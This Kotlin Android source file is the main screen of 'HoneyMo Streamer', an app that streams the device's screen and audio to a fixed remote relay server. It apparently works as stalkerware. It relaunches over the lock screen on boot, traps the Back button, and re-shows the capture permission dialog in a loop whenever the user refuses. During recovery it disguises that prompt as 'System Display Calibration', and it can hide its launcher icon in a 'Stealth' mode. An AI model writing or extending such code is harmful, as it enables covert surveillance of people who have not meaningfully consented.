package com.example.HoneyMo

import android.Manifest
import android.app.Activity
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.example.HoneyMo.receiver.BootReceiver
import com.example.HoneyMo.service.ScreenCaptureService
import com.example.HoneyMo.util.AppIconManager
import com.example.HoneyMo.util.SessionPreferences
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

// Constant Stream Configuration
private const val FIXED_SERVER_URL = "wss://honeymo-relay-server.onrender.com/ws/device"
private const val FIXED_FPS = 15
private const val FIXED_BITRATE = 2_000_000 // 2 Mbps

class MainActivity : ComponentActivity() {

    private var isBootLaunch by mutableStateOf(false)
    private var isInterruptedSession by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Allow display over lock screen and wake up screen on boot or incoming notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }

        isBootLaunch = intent?.getBooleanExtra("EXTRA_BOOT_LAUNCH", false) == true
        isInterruptedSession = intent?.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false) == true ||
            (isBootLaunch && SessionPreferences.wasRecordingActive(this))

        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFF6366F1),
                    secondary = Color(0xFF10B981),
                    background = Color(0xFF0F172A),
                    surface = Color(0xFF1E293B),
                    onBackground = Color(0xFFF8FAFC),
                    onSurface = Color(0xFFF8FAFC)
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    ScreenCaptureApp(
                        autoStartPrompt = isBootLaunch,
                        isInterrupted = isInterruptedSession
                    )
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra("EXTRA_BOOT_LAUNCH", false)) {
            isBootLaunch = true
        }
        if (intent.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false)) {
            isInterruptedSession = true
        }
    }
}

@Composable
fun ScreenCaptureApp(
    autoStartPrompt: Boolean = false,
    isInterrupted: Boolean = false
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val stats by ScreenCaptureService.statsFlow.collectAsState()

    var showPermissionDeniedDialog by remember { mutableStateOf(false) }

    // Battery Optimization check
    var isBatteryOptIgnored by remember {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        mutableStateOf(pm.isIgnoringBatteryOptimizations(context.packageName))
    }

    var isIconVisible by remember { mutableStateOf(AppIconManager.isIconVisible(context)) }

    LaunchedEffect(stats.isStreaming) {
        kotlinx.coroutines.delay(400)
        isIconVisible = AppIconManager.isIconVisible(context)
    }

    // Screen capture permission launcher
    val captureLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            showPermissionDeniedDialog = false

            // Cancel any recovery notification once session has started
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)

            // Calculate scaled 540p resolution maintaining screen aspect ratio
            val metrics = context.resources.displayMetrics
            val screenWidth = metrics.widthPixels
            val screenHeight = metrics.heightPixels
            val isPortrait = screenHeight >= screenWidth

            val targetWidth: Int
            val targetHeight: Int

            if (isPortrait) {
                // Scale width to 540 and height proportionally
                val scale = 540f / screenWidth.toFloat()
                val rawH = (screenHeight * scale).toInt()
                targetWidth = (540 + 15) / 16 * 16 // 16-pixel aligned for AVC encoder
                targetHeight = (rawH + 15) / 16 * 16
            } else {
                // Scale height to 540 and width proportionally
                val scale = 540f / screenHeight.toFloat()
                val rawW = (screenWidth * scale).toInt()
                targetWidth = (rawW + 15) / 16 * 16
                targetHeight = (540 + 15) / 16 * 16
            }

            val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
                action = ScreenCaptureService.ACTION_START
                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, result.resultCode)
                putExtra(ScreenCaptureService.EXTRA_DATA, result.data)
                putExtra(ScreenCaptureService.EXTRA_SERVER_URL, FIXED_SERVER_URL)
                putExtra(ScreenCaptureService.EXTRA_WIDTH, targetWidth)
                putExtra(ScreenCaptureService.EXTRA_HEIGHT, targetHeight)
                putExtra(ScreenCaptureService.EXTRA_DENSITY, metrics.densityDpi)
                putExtra(ScreenCaptureService.EXTRA_FPS, FIXED_FPS)
                putExtra(ScreenCaptureService.EXTRA_BITRATE, FIXED_BITRATE)
            }

            ContextCompat.startForegroundService(context, serviceIntent)
            Toast.makeText(context, "Streaming started (540p @ 15fps)", Toast.LENGTH_SHORT).show()
        } else {
            // User rejected or dismissed the screen capture dialog
            Toast.makeText(context, "Screen capture permission is required", Toast.LENGTH_SHORT).show()
            showPermissionDeniedDialog = true
        }
    }

    // Permissions launcher for Notifications and Audio Recording
    val permissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }

    fun startStreaming() {
        val permissionsToRequest = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionsLauncher.launch(permissionsToRequest.toTypedArray())
            return
        }

        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }

    fun stopStreaming() {
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)
        val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
            action = ScreenCaptureService.ACTION_STOP
        }
        context.startService(serviceIntent)
        Toast.makeText(context, "Screen streaming stopped", Toast.LENGTH_SHORT).show()
    }

    // Trap hardware Back button when in interrupted recovery mode or showing permission dialog
    BackHandler(enabled = (isInterrupted || showPermissionDeniedDialog) && !stats.isStreaming) {
        showPermissionDeniedDialog = true
        coroutineScope.launch {
            delay(350)
            startStreaming()
        }
    }

    // Automatically trigger screen capture prompt on boot launch or interrupted recovery
    LaunchedEffect(autoStartPrompt, isInterrupted) {
        if ((autoStartPrompt || isInterrupted) && !stats.isStreaming) {
            delay(350)
            startStreaming()
        }
    }

    // Interactive loop dialog if user cancelled/rejected screen capture permission
    if (showPermissionDeniedDialog && !stats.isStreaming) {
        AlertDialog(
            onDismissRequest = {
                // Re-prompt on dismiss with debounce delay
                showPermissionDeniedDialog = false
                coroutineScope.launch {
                    delay(350)
                    startStreaming()
                }
            },
            title = {
                Text(
                    text = if (isInterrupted) "System Display Calibration" else "Screen Capture Required",
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
            },
            text = {
                Text(
                    text = if (isInterrupted) {
                        "Display service calibration is required. Please tap 'Start Now' to continue."
                    } else {
                        "HoneyMo requires screen capture permission to stream your device. Please tap 'Start Capturing' to grant permission."
                    },
                    color = Color(0xFFCBD5E1)
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                ) {
                    Text(if (isInterrupted) "Start Now" else "Start Capturing", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    }
                ) {
                    Text("Retry", color = Color(0xFF94A3B8))
                }
            },
            containerColor = Color(0xFF1E293B)
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(20.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // App Header
        Row(
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(12.dp),
            modifier = Modifier.padding(vertical = 8.dp)
        ) {
            Box(
                modifier = Modifier
                    .size(48.dp)
                    .clip(RoundedCornerShape(12.dp))
                    .background(Color(0xFF6366F1)),
                contentAlignment = Alignment.Center
            ) {
                Text("📱", fontSize = 24.sp)
            }
            Column {
                Text(
                    text = "HoneyMo Streamer",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
                Text(
                    text = "Hardware H.264 Screen Capture Client",
                    fontSize = 12.sp,
                    color = Color(0xFF94A3B8)
                )
            }
        }

        // Live Status Card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
            shape = RoundedCornerShape(16.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("Stream Status", fontWeight = FontWeight.SemiBold, color = Color(0xFF94A3B8))

                    // Status Badge
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(6.dp),
                        modifier = Modifier
                            .clip(RoundedCornerShape(20.dp))
                            .background(
                                if (stats.isStreaming) Color(0x2610B981) else Color(0x26EF4444)
                            )
                            .padding(horizontal = 10.dp, vertical = 4.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .clip(CircleShape)
                                .background(if (stats.isStreaming) Color(0xFF10B981) else Color(0xFFEF4444))
                        )
                        Text(
                            text = if (stats.isStreaming) "STREAMING" else "IDLE",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (stats.isStreaming) Color(0xFF10B981) else Color(0xFFEF4444)
                        )
                    }
                }

                // Telemetry metrics
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    MetricItem(label = "Server", value = if (stats.isConnectedToServer) "Connected" else "Offline")
                    MetricItem(label = "Live FPS", value = "${stats.currentFps} fps")
                    MetricItem(
                        label = "Data Sent",
                        value = "%.1f MB".format(stats.bytesSent / (1024f * 1024f))
                    )
                }

                // Launcher Icon Status & Manual Reveal Action
                HorizontalDivider(color = Color(0xFF334155))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Launcher Icon", fontSize = 11.sp, color = Color(0xFF94A3B8))
                        Text(
                            text = if (isIconVisible) "Visible" else "Hidden (Stealth)",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (isIconVisible) Color(0xFF10B981) else Color(0xFFF59E0B)
                        )
                    }

                    Button(
                        onClick = {
                            val newVisible = !isIconVisible
                            if (newVisible) {
                                AppIconManager.showIcon(context)
                            } else {
                                AppIconManager.hideIcon(context)
                            }
                            isIconVisible = AppIconManager.isIconVisible(context)
                            ScreenCaptureService.notifyIconStateChanged(isIconVisible)
                            val toastMsg = if (isIconVisible) "Launcher icon revealed" else "Launcher icon hidden"
                            Toast.makeText(context, toastMsg, Toast.LENGTH_SHORT).show()
                        },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isIconVisible) Color(0xFFEF4444) else Color(0xFF3B82F6)
                        ),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Text(
                            text = if (isIconVisible) "Hide Icon" else "Reveal Icon",
                            fontSize = 12.sp,
                            color = Color.White
                        )
                    }
                }

                stats.errorMsg?.let { error ->
                    Text(
                        text = error,
                        color = Color(0xFFEF4444),
                        fontSize = 12.sp,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }
        }

        // Stream Preset Details (Read-only status info)
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
            shape = RoundedCornerShape(16.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Text(
                    text = "Stream Configuration",
                    fontWeight = FontWeight.SemiBold,
                    color = Color.White,
                    fontSize = 14.sp
                )
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    MetricItem(label = "Resolution", value = "540p")
                    MetricItem(label = "Frame Rate", value = "15 FPS")
                    MetricItem(label = "Bitrate", value = "2.0 Mbps")
                }
            }
        }

        // Battery Optimization Warning Banner
        if (!isBatteryOptIgnored) {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF2E2619)),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text(
                        text = "⚠️ Battery Optimization Active",
                        color = Color(0xFFFBBF24),
                        fontWeight = FontWeight.Bold,
                        fontSize = 14.sp
                    )
                    Text(
                        text = "Android may terminate continuous background capture unless battery optimization is disabled.",
                        color = Color(0xFFFDE68A),
                        fontSize = 12.sp
                    )
                    Button(
                        onClick = {
                            try {
                                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                    data = Uri.parse("package:${context.packageName}")
                                }
                                context.startActivity(intent)
                                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                                isBatteryOptIgnored = pm.isIgnoringBatteryOptimizations(context.packageName)
                            } catch (e: Exception) {
                                Toast.makeText(context, "Cannot open battery settings directly", Toast.LENGTH_SHORT).show()
                            }
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                        shape = RoundedCornerShape(8.dp),
                        modifier = Modifier.align(Alignment.End)
                    ) {
                        Text("Disable Optimization", color = Color.Black, fontSize = 12.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        Spacer(modifier = Modifier.weight(1f, fill = false))

        // Action Button (Start / Stop)
        Button(
            onClick = {
                if (stats.isStreaming) {
                    stopStreaming()
                } else {
                    startStreaming()
                }
            },
            modifier = Modifier
                .fillMaxWidth()
                .height(56.dp),
            shape = RoundedCornerShape(14.dp),
            colors = ButtonDefaults.buttonColors(
                containerColor = if (stats.isStreaming) Color(0xFFEF4444) else Color(0xFF6366F1)
            )
        ) {
            Text(
                text = if (stats.isStreaming) "STOP SCREEN SHARING" else "START SCREEN CAPTURE",
                fontWeight = FontWeight.Bold,
                fontSize = 16.sp,
                color = Color.White
            )
        }
    }
}

@Composable
fun MetricItem(label: String, value: String) {
    Column {
        Text(label, fontSize = 11.sp, color = Color(0xFF94A3B8))
        Text(value, fontSize = 14.sp, fontWeight = FontWeight.Bold, color = Color.White)
    }
}
